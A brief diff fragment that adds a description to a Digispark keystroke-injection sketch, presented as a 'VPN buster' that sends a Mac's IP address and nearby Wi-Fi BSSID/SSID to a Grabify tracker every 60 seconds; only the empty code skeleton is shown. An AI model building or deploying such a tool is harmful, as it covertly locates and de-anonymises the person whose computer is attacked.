@@ -1,3 +1,5 @@
+* Digispark VPN buster to send the IP address and BSSID/SSID of nearby Wi-Fi networks on a MacOS computer to a Grabify tracker every 60 seconds.
+
 #include "DigiKeyboard.h"
 void setup() {}
 void loop() {
